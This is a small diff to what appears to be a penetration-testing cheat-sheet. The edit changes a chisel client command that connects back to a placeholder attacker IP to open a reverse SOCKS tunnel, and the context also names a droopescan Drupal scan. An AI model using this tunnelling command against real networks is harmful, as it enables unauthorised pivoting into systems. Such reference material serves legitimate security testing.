@@ -420,7 +420,7 @@ droopescan scan drupal --url http://<target>
   ### Connecting from the client
 
    ```shell
-  .\chisel client <attacker-ip>>:<PORT> R:socks
+  .\chisel.exe client <attacker-ip>>:<PORT> R:socks
   ```
 
   ### Sending command via the tunnel
